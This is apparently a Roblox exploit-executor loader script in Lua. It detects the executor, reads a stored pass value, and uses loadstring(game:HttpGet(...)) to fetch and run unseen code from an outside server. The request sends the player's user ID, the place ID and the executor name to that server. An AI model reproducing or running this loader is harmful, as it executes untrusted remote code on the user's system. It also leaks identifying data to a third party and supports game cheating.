local l=game:GetService("Players").LocalPlayer
local o,x=pcall(function() return identifyexecutor() end)
local G=(getgenv and getgenv()) or _G
local p=(G.CCRAFT_PASS and G.CCRAFT_PASS["7d02b640"]) or ""
loadstring(game:HttpGet("https://api.ccraftspace.dpdns.org/p/7d02b640811b497a8d564d28c170f028?t=6adf671c-7990d4be5d527941b9a2af5d-0-0-338e3bf8-7fb55b99add24c0b01c907422ca8869b&p="..p.."&u="..(l and l.UserId or 0).."&g="..game.PlaceId.."&x="..tostring(o and x or ""):gsub("%W","")))()